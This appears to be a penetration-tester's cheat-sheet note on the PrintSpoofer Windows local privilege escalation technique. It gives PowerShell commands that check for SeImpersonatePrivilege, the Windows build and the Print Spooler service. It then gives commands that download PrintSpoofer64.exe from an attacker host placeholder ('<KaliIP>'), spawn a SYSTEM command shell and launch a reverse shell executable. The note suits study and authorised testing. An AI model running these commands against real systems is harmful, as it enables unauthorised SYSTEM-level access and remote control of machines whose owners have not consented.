---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

## PrintSpoofer
resources: [PrintSpoofer GitHub](https://github.com/itm4n/PrintSpoofer), [HackTricks PrintSpoofer](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)

> [!info] Abuses Print Spooler service via named pipes to impersonate SYSTEM. Requires **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege**. Works on Windows 10 build 1809+ and Server 2019+.

### Initial Checks
```powershell
whoami /priv | Select-String "SeImpersonate|SeAssignPrimaryToken"
```

```powershell
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild -ge 17763
```

```powershell
(Get-Service Spooler).Status -eq 'Running'
```
### Execution

```powershell
# Download
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/PrintSpoofer64.exe','ps.exe')

# Spawn SYSTEM cmd
.\ps.exe -i -c cmd

# Or run reverse shell
.\ps.exe -i -c "C:\path\reverse.exe"
```
